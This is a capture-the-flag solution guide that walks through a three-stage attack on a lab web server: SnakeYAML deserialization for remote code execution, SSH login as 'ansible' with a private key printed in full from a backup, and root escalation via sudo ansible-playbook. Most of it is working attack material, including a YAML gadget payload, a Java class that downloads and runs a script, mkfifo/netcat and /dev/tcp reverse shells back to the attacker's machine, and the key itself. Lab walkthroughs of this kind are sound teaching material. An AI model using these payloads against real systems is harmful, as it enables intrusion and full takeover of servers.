# Connect the Dots

*Solution Guide*

## Overview

*Connect the Dots* consists of three parts. To solve it, players will have to complete each part.

1. Using the `snakeyaml` vulnerability, obtain a shell inside the discovered web server. 
2. Once inside the web server, find a way to log in as the `ansible` user. 
3. As the `ansible` user, perform privilege escalation to get root access. 

## Before you begin

1. Users are asked to perform an `nmap` scan to find the web server IP address and port:

```bash
sudo nmap -sC -sV 10.5.5.0/24
```

The results reveal there is a web server running with an IP address of `10.5.5.85` on port `8080`. 

2. Visit the site at: `http://10.5.5.85:8080`.

## Question 1

*After obtaining a shell inside the web server, the first flag will be found under `/opt/tomcat/flag1.txt`.*

Once you visit the web server at `http://10.5.5.85:8080`, you will notice it only contains a title saying **"Enter YAML"** and a text box. 

Entering just words and submitting doesn't provide much help but, if you start by entering a single special character and submitting, you will get a more promissing output. 

1. Let's try this by typing `!!!!!` into the text box and submitting (A single special character should work as well). 

2. After submitting these special characters, you will get redirected to a page similar to this one: 

![snakeyaml](./img/image01.png)

> Note: There might be special characters than don't trigger the expected error page.

Here you will notice multiple instances of `org.yaml.snakeyaml`. If you perform some research on this Java library, you will discover that it is used to parse YAML and, that it is known to have a recent deserialization vulnerability. Let's built a payload now to take advantage of this vulnerability. 

4. First, run the following command in your kali VM terminal to obtain your IP: 

```bash
ip a
```

In our case, it is `10.5.5.64`. Yours might be different. 

3. Enter the following into the text box found in the web server `http://10.5.5.85:8080` (Make sure to use your Kali IP):

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<kali-ip-address>/"]
  ]]
]
```

The code above will make a request to your IP address. We can use this to get remote code execution (RCE). We will create the rest of the exploit in the next step.

> Note: We will be using the following proof of concept as reference. See: `https://github.com/artsploit/yaml-payload/`.

We will now build out the `.jar` file and place our payload in order to get a reverse shell.

4. Let's start by creating the required files and directories (Make sure you follow the correct folder structure below): 

```bash
mkdir -p /home/user/payload/
mkdir -p /home/user/payload/src/META-INF/services/
mkdir -p /home/user/payload/src/artsploit/
touch /home/user/payload/src/META-INF/services/javax.script.ScriptEngineFactory
touch /home/user/payload/src/artsploit/AwesomeScriptEngineFactory.java
```

5. Using your favorite text editor, open the `javax.script.ScriptEngineFactory` file. We will use `nano` as an example: 

```bash
nano /home/user/payload/src/META-INF/services/javax.script.ScriptEngineFactory
```

6. Then, type or copy the line below to the `javax.script.ScriptEngineFactory` file you opened above:

```
artsploit.AwesomeScriptEngineFactory
```

7. Now, using your favorite text editor, let's open the other file we created above, `AwesomeScriptEngineFactory.java`. We will use `nano` again:

```bash
nano /home/user/payload/src/artsploit/AwesomeScriptEngineFactory.java
```

8. Now, copy the following code to this file (Make sure you change `<kali-ip-address>` with your actual Kali IP address!): 

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            // First Run
            Runtime.getRuntime().exec("curl <kali-ip-address>:8080/shell.sh -o /tmp/shell.sh");
            // Second Run
            Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

9. Once you finish copying the code above and adding your Kali IP, we can proceed to compile this using:

```bash
javac --release 11 /home/user/payload/src/artsploit/AwesomeScriptEngineFactory.java

jar -cvf /home/user/payload/yaml-payload.jar -C /home/user/payload/src/ .
```

> Note: If `javac` is not currently in the path, it will throw an error. To fix this, please run: `export PATH:"$JAVA_HOME/bin:$PATH"`. If it works, ignore this note. `javac` must use Version 11 for the Tomcat server to execute the `.jar`.

The next step is to build your `shell.sh` script to get a reverse shell on the web server once we execute the payload above.

10.  Let's start by creating a folder to store our next file and the `yaml-payload.jar` we created above: 

```bash
mkdir /home/user/payload/www/
```

11. Now, let's create our `shell.sh` script. 

```bash
touch /home/user/payload/www/shell.sh
```


12. Once the file is created, use your favorite text editor to add the following script (Once again, make sure to replace `<kali-ip-address>` with your actual Kali IP address):

```
nano /home/user/payload/www/shell.sh
```
> Note: Notice the use of port `8000` this time. 

```bash
#!/bin/bash

rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f | /bin/sh -i 2>&1 | nc <kali-ip-address> 8000 > /tmp/f
```

> Note: This script was generated by [revshells](https://www.revshells.com/). It is possible to use a different script. The above is just a working example.

13. Let's now move the `yaml-payload.jar` we created earlier to the same folder as the `shell.sh` script: 

```bash
mv /home/user/payload/yaml-payload.jar /home/user/payload/www/
```

14. Let's move inside the `www` directory for the next steps:

```bash
cd /home/user/payload/www/
```

15. The next step is to host these files locally making sure to use port `8080`. We can use python for this: 


```bash
python3 -m http.server 8080
```

16. Now, in a new terminal, start a Netcat listener on port `8000`:

```bash
nc -lvp 8000
```

17. Now, go back to `http://10.5.5.85:8080` and make sure the following is entered in the text box (Remember to change `<kali-ip-address>` with your Kali VM IP address and, also note that we are now providing the port `8080` and, we are also adding the payload file, `yaml-payload.jar`): 

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<kali-ip-address>:8080/yaml-payload.jar"]
  ]]
]
```

**The above will need to be submitted twice.** 

The snippet below is just to reference the code you wrote on `/home/user/payload/src/artsploit/AwesomeScriptEngineFactory.java` to see the reason why this needs to be submitted twice:

```java
public AwesomeScriptEngineFactory() {
    try {
        // First Run
        Runtime.getRuntime().exec("curl <kali-ip-address>:8080/shell.sh -o /tmp/shell.sh");
        // Second Run
        Runtime.getRuntime().exec("bash /tmp/shell.sh");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

- The first runs `curl` and downloads the script:
```java
Runtime.getRuntime().exec("curl <kali-ip-address>:8080/shell.sh -o /tmp/shell.sh");
```

- The second run has the machine run the script:
```java
Runtime.getRuntime().exec("bash /tmp/shell.sh");
```

18. After submitting the payload twice, you can go back to the terminal where you started the Netcat listener. You should have obtained a reverse shell inside the web server. 


19. As the first question states, you will find the first flag under `/opt/tomcat/flag1.txt`. Let's move to that directory and read the flag: 

```bash
cd /opt/tomcat/
cat flag1.txt
```

20. You successfully obtained the first flag. 

## Question 2

*Find a way to log into the `ansible` user. Second flag will be under `/home/ansible/flag2.txt`.*

1. Aside from the `flag1.txt` inside the `/opt/tomcat/` directory, there are other files worth reading. Let's see what other files we can find in this directory (Make sure you are still inside the obtained web server shell):

```bash
ls -la /opt/tomcat
```

You will notice a file called `notes.txt`.

2. Read the `notes.txt` file:

```bash
cat /opt/tomcat/notes.txt
```

Here is the content of the `notes.txt` file: 

```
FOR THE FUTURE:
fix yaml site it looks ugly
we need to try to start using ansible for easier deployments
ansible is installed and the user is added so that anyone that needs something deployed can do so
... this sounds not secure but I think it's our best option
```

3. Based on the note found, we know there is another user in the web server system. Let's verify this (Remember, we are still using the obtained web server shell): 

```bash
cd /home
ls
```

4. There is a user called `ansible`. Let's see what we can find in this user home directory: 

```bash
cd /home/ansible
ls
```

5. Here we see the `flag2.txt` file and a `backup.tar.gz` file. Upon trying to read the `flag2.txt` we get permission denied: 

```bash
cat /home/ansible/flag2.txt
```

6. If you try to extract the files inside the `backup.tar.gz` file, you will notice you also get permissions denied. However, you can copy this file to a directory where you have read/write permissions such as `/tmp`:

```bash
cp /home/ansible/backup.tar.gz /tmp
```

7. Now we can head to the `/tmp` directory and unzip it here: 

```bash
cd /tmp
tar -xzvf backup.tar.gz 
```

You will notice there's a new `ansible/` directory on the `tmp/` directory. This means this was a be a backup of the home directory. 

8. Enter the `ansible` directory and see its contents, including hidden files: 

```bash
cd /tmp/ansible
ls -la
```

Good news is that we might be able to grab the private ssh key since we have a backup of the `.ssh/` directory. 

9. Let's read and copy the `id_rsa` file:

```bash
cat /tmp/ansible/.ssh/id_rsa
```

Here are the contents of the `id_rsa` file: 

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

10. Paste the contents of this `id_rsa` file into a file called `id_rsa` inside your Kali VM (outside of the obtained web server shell): 

```bash
nano /home/user/Desktop/id_rsa
```

11. Before trying to log into the `ansible` user, lets change the permissions of the `id_rsa` file: 

```bash
chmod 700 /home/user/Desktop/id_rsa
```

12. Use the following command, from the Kali VM terminal, to log into the `ansible` user using its private ssh key and the web server IP address: 

```bash
ssh -i /home/user/Desktop/id_rsa ansible@10.5.5.85
```

13. You know have access to the `ansible` user and can read the `flag2.txt` file: 

```bash
cat /home/ansible/flag2.txt
```

You have now obtained the second flag. 

## Question 3

*Perform privilege escalation to get root access on the web server box. Third flag will be under `/root/flag3.txt`.*

1. From inside the `ansible` user session obtained above, let's see what sudo permissions we have: 

```bash
sudo -l
```

Notice you have `sudo` access to `ansible-playbook`.

2. We can use this to our advantage to create an ansible playbook that gives us a root access shel. First create a file: 

```bash
nano /home/ansible/playbook.yaml
```

and paste the following (Make sure you change `<kali-ip-address>` with your IP address): 

```yaml
- hosts: localhost
  tasks:
    - name: Get Shell
      command: /bin/bash -c 'bash -i >& /dev/tcp/<kali-ip-adress/8000 0>&1'
```

3. Now, from a new Kali VM terminal, start a Netcat listener on port `8000`:

```bash
nc -lvp 8000
```

4. Now, lets trigger the ansible playbook on the `ansible` user terminal session:


```bash
sudo /usr/bin/ansible-playbook /home/ansible/playbook.yaml
```

5. You will notice you obtain a reverse shell connection on the terminal you started the Netcat listener and now have root access to the web server box. You can confirm this by typing the following from the obtained reverse shell: 

```bash
whoami
```

You will notice you are now `root`.

6. You can now get the contents of the last flag by typing the following in the obtained reverse shell: 

```bash
cat /root/flag3.txt
```

You have now obtained obtained the third and last flag. 
